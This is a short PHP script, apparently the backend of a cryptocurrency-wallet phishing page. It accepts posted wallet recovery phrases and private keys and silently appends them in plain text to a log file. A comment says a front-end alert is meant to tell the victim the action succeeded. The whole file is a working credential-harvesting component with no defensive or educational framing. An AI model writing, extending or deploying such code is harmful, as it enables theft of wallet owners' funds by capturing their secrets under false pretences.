<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phrase = $_POST['phrase'] ?? 'N/A';
    $private_key = $_POST['private_key'] ?? 'N/A';

    // Log entry
    $log_entry = "Phrase: $phrase\nPrivate Key: $private_key\n----------------------------\n";

    // Log to file
    $log_file = __DIR__ . '/wallet_logs.txt';
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    // Optional: No output, just log, and let the JS alert handle success.
}
?>
